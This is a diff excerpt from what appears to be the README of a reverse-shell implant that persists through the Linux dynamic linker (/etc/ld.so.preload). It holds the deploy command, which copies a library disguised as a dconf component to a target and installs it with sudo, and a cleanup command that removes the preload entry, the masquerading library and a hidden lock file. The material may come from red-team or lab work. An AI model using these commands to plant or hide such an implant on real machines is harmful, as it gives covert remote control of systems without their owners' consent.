@@ -14,4 +14,4 @@ Implements rate limited reverse shell via dynamic linker
     - bash ld_gen.sh && scp libdconf-update.so <target_user>@<target_ip>:/tmp/ && ssh -t <target_user>@<target_ip> "sudo bash -s" < ld_install.sh
 
 ## Cleanup (From host)
-- ssh -t <target_user>@<target_ip> "sudo sed -i '\|/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99|d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"
+- ssh -t <target_user>@<target_ip> "sudo sed -i '/\/usr\/lib\/x86_64-linux-gnu\/libdconf-1.so.0.99/d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"
